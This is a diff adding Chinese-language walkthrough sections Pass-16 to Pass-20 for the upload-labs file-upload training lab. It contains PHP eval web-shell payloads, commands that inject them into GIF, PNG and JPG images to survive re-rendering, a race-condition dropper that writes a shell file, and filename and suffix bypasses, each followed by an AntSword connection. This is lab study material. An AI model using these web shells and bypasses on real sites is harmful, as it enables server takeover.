@@ -20,13 +20,13 @@ upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CT
 
 4. 如果黑盒情况下，实在做不出，可以点击查看源码。
 
-5. Pass-19 必须在 linux 下
-
 **后续:**
 
 如在渗透测试实战中遇到新的上传漏洞类型，会更新到 upload-labs 中。当然如果你也希望参加到这个工作当中，欢迎 pull requests 给我!
 
 项目地址：https://github.com/c0ny1/upload-labs
+
+![文件上传](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/文件上传.3k88gqmp8o.webp)
 
 ## Pass-01
 
@@ -483,3 +483,189 @@ cat fish_real.jpg fish1.php > fish_trojan.jpg
 
 ![PixPin_2025-05-09_20-19-03](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-19-03.7egzpj41lr.webp)
 
+## Pass-16
+
+尝试 **二次渲染绕过**
+
+1、gif 绕过
+
+上传正确的图片 `fish_real.gif`，将上传后的照片另存为 `fish2_real.gif`，并使用 010 Editor 比较两张图片
+
+![PixPin_2025-05-13_16-31-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-31-41.67xomf255n.webp)
+
+在未被二次渲染的部分插入一句话木马，另存为 `fish2_trojan.gif` 后上传成功
+
+![PixPin_2025-05-13_16-32-08](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-32-08.3nru9s2rc0.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-13_16-33-04](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-33-04.7i0lsqm0ma.webp)
+
+2、png 绕过
+
+使用 Python 写了一个用于 png 二次渲染绕过的脚本，项目地址：[png_payload](https://github.com/Puppy1599/png_payload)
+
+```shell
+python png_payload.py --input fish.png --payload "<?php @eval($_POST['fish']);?>" --offset 0
+```
+
+可以使用 010 Editor 看到 `fish-payload.png` 中注入的 payload
+
+![PixPin_2025-05-14_20-42-43](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-42-43.5xauuy1njo.webp)
+
+上传成功，但下载上传后的图片发现 payload 不完整
+
+![PixPin_2025-05-14_20-44-02](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-02.4jobqws99w.webp)
+
+> [!WARNING]
+> 经过测试需要设置一个合适的 PLTE block 偏移量，当 `offset` 为 `0` 时 payload 将被注入到 PLTE 头部，可能导致二次渲染后的 payload 不完整。
+
+将 `offset` 设置为 `30`
+
+```shell
+python png_payload.py --input fish.png --payload "<?php @eval($_POST['fish']);?>" --offset 30
+```
+
+![PixPin_2025-05-14_20-44-47](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-47.2rvcw09ual.webp)
+
+上传成功，下载上传后的图片发现 payload 完整
+
+![PixPin_2025-05-14_20-45-33](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-45-33.92qctvzok3.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-14_20-46-11](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-46-11.5xauuy655i.webp)
+
+3、jpg 绕过
+
+参考了一个用于 jpg 二次渲染绕过的 php 脚本并使用 Python 进行了打包，项目地址：[jpg_payload](https://github.com/Puppy1599/jpg_payload)
+
+上传正确的图片 `fish_real.jpg`，将上传后的照片另存为 `fish2_real.jpg`，使用 `jpg_payload` 注入 payload
+
+```shell
+jpg_payload.exe fish2_real.jpg "<?php @eval($_POST['fish']);?>"
+```
+
+可以使用 010 Editor 看到 `payload_fish2_real.jpg` 中注入的 payload
+
+![PixPin_2025-05-14_22-33-00](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-00.7p3tpyitno.webp)
+
+上传成功，下载上传后的图片发现 payload 完整
+
+![PixPin_2025-05-14_22-33-46](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-46.1ap7ud1ux8.webp)
+
+使用蚁剑进行连接
+
+![PixPin_2025-05-14_22-40-40](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-40-40.67xoo7omw0.webp)
+
+> [!WARNING]
+> jpg 图片二次渲染绕过不易成功，需要多换几张图片尝试。
+
+## Pass-17
+
+利用 **条件竞争绕过**
+
+上传 `shell.php`（用于生成 `fish.php`）
+
+```php {filename="shell.php"}
+<?php fputs(fopen("fish.php","w"), "<?php @eval(\$_POST['fish']);?>");?>
+```
+
+![PixPin_2025-05-15_20-31-42](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-31-42.pfk9dfmmv.webp)
+
+访问 `shell.php`
+
+![PixPin_2025-05-15_20-36-21](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-21.3k88f5vfz0.webp)
+
+将 `/upload-labs-0.1/Pass-17/index.php` 和 `/upload-labs-0.1/upload/shell.php` 两条记录发送到 `Intruder` 模块
+
+![PixPin_2025-05-15_20-36-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-50.2veyv58jqp.webp)
+
+设置两条记录 `Payload 类型` 为 `Null payloads`，无限重复
+
+![PixPin_2025-05-15_20-44-10](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-44-10.1vyvhzfbp9.webp)
+
+设置两条记录 `最大并发请求数` 为 `25`
+
+![PixPin_2025-05-15_20-45-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-20.2obqzpxb0n.webp)
+
+![PixPin_2025-05-15_20-46-41](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-41.67xopj1rkz.webp)
+
+开始攻击
+
+![PixPin_2025-05-15_20-45-54](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-54.9kgejwhbhv.webp)
+
+![PixPin_2025-05-15_20-46-57](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-57.8ojx4g8zux.webp)
+
+观察到 `/upload-labs-0.1/upload/shell.php` 攻击时出现 `200` 状态码时停止攻击
+
+![PixPin_2025-05-15_20-48-33](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-48-33.73u64zdv2a.webp)
+
+使用蚁剑连接 `fish.php`
+
+![PixPin_2025-05-15_20-49-17](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp)
+
+## Pass-18
+
+> [!WARNING]
+> 这里的路径拼接有问题，上传一个 `jpg` 图片应该是 `upload/1747315674.jpg`，但实际拼出来的是 `upload1747315674.jpg`，修改 `Pass-18/myupload.php` 的 `$this->cls_upload_dir = $dir;` 为 `$this->cls_upload_dir = $dir.'/';`
+
+![PixPin_2025-05-15_21-38-24](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_21-38-24.6pnqe5xqw1.webp)
+
+利用 **Apache 多后缀解析漏洞 + 条件竞争**
+
+上传 `shell.php.7z`（用于生成 `fish.php`）
+
+```php {filename="shell.php.7z"}
+<?php fputs(fopen("fish.php","w"), "<?php @eval(\$_POST['fish']);?>");?>
+```
+
+![PixPin_2025-05-16_21-17-47](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-17-47.5mo14or8rq.webp)
+
+访问 `shell.php.7z`
+
+![PixPin_2025-05-16_21-18-52](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-18-52.1sf9lqaml8.webp)
+
+将两条请求发送到 `Intruder` 模块
+
+![PixPin_2025-05-16_21-20-46](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-20-46.8z6qz2bl5w.webp)
+
+配置条件竞争的 `payload`
+
+![PixPin_2025-05-16_21-21-32](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-32.7zqnlw9sq9.webp)
+
+![PixPin_2025-05-16_21-21-49](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-21-49.6f0wmfcy6h.webp)
+
+观察到 `/upload-labs-0.1/upload/shell.php.7z` 攻击时出现 `200` 状态码时停止攻击
+
+![PixPin_2025-05-16_21-22-28](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_21-22-28.969yuhzx9v.webp)
+
+使用蚁剑连接 `fish.php`
+
+![PixPin_2025-05-15_20-49-17](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp)
+
+## Pass-19
+
+尝试 **点绕过**
+
+保存名称 `fish1.php.`，上传成功
+
+![PixPin_2025-05-16_22-34-50](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-34-50.1zihh8mjzw.webp)
+
+使用蚁剑连接 `fish1.php`
+
+![PixPin_2025-05-16_22-35-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-35-20.39lenk532m.webp)
+
+## Pass-20
+
+代码审计
+
+![PixPin_2025-05-16_22-47-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-47-20.1sf9ltgdkj.webp)
+
+修改 `Content-Type: image/jpeg`、`save_name[0]` 和 `save_name[2]`
+
+![PixPin_2025-05-16_22-45-28](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-28.2veywp9uo4.webp)
+
+使用蚁剑连接 `fish.php`
+
+![PixPin_2025-05-16_22-45-57](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-16_22-45-57.3rbgc5k7ps.webp)
